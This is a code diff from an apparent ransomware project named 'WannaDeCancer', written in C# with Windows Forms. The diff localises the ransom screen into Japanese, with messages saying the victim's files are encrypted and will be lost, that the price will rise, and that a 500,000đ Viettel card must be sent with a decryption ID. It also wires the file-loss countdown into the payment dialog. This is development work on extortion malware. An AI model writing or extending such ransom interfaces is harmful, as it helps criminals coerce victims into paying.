@@ -11,12 +11,14 @@ using System.IO;
 
 namespace WannaDeCancer
 {
+
     public partial class GUIMain : Form
     {
         #region Field
         DateTimeConverter dateTimeConverter;
         DateTime raise;
         DateTime lost;
+        TimeSpan lostCountDown;
         Thread expireCountDown;
         bool isTimeCorrect = true;
         #endregion
@@ -102,11 +104,11 @@ namespace WannaDeCancer
                     //ko co wifi dich sau
                     txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\JP.txt", EncodeType.Unicode);
                     lbTitle.Text = "お使いのファイルは暗号化されています。";
-                    lbDesLost.Text = "File của bạn sẽ bị mất vào:";
-                    lbDesRaise.Text = "Tăng giá vào:";
-                    lbDesTimeLeftRaise.Text = "Thời gian còn lại:";
-                    lbDesTimeLeftLost.Text = "Thời gian còn lại: ";
-                    lbSend.Text = "Gửi 500.000đ Thẻ Viettel bao gồm id giải mã hóa";
+                    lbDesLost.Text = "あなたのファイルは失われます：";
+                    lbDesRaise.Text = "価格の上昇：";
+                    lbDesTimeLeftRaise.Text = "残り時間：";
+                    lbDesTimeLeftLost.Text = "残り時間： ";
+                    lbSend.Text = "500.000đを送信するViettelカードにはIDの復号化が含まれています";
                     break;
                 default:
                     break;
@@ -122,7 +124,7 @@ namespace WannaDeCancer
             {
                 // Minus
                 TimeSpan raiseCountDown = raise - DateTime.Now;
-                TimeSpan lostCountDown = lost - DateTime.Now;
+                lostCountDown = lost - DateTime.Now;
 
                 // Set the label text = timeSpan
                 lbRaiseTimeLeft.Text = raiseCountDown.ToString().Substring(0, raiseCountDown.ToString().LastIndexOf('.'));
@@ -163,7 +165,7 @@ namespace WannaDeCancer
 
         private void btnSend_Click(object sender, EventArgs e)
         {
-            FormSend formSend = new FormSend();
+            FormSend formSend = new FormSend(cbxLang.Text, lostCountDown);
             formSend.ShowDialog();
         }
     }
